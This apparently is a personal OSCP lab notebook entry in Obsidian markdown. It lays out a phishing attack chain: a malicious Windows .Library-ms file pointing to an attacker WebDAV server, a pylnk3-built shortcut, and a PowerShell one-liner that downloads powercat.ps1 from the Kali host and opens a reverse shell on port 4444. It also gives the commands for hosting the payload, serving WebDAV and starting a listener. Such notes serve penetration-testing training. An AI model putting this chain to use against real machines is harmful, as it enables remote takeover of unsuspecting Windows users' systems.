```
mkdir webdav
```

```
vim config.Library-ms
```

Edit KALI IP
```powershell
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.222</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

[[pylnk3]]

Activate pylnk
```
python3 -m venv .venv  && source .venv/bin/activate && pip install pylnk3
```

cd to machine directory
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const machine = page?.MACHINE ?? "NO MACHINE FOUND";

const command = `cd ~/Desktop/PEN200/${machine}`;

dv.paragraph("```bash\n" + command + "\n```");
```

Host Powercat.ps1 for pylink3 to grab

```
cd ~/Desktop/Tools/Windows && python -m http.server 8000
```

Create documents.lnk shortcut on native windows OS (edit machine path and both KALI IP) 

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://${KaliIP}:8000/powercat.ps1'); powercat -c ${KaliIP} -p 4444 -e powershell"`;

dv.paragraph("```bash\n" + command + "\n```");
```

Host webdav server port 80 in webdav directory
```
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/Desktop/PEN200/Beyond/webdav/
```

Start listener on KALI ATTACKER

```
cd ~/Desktop/Tools && python3 penelope.py -p 4444
```

[[SWAKS]]
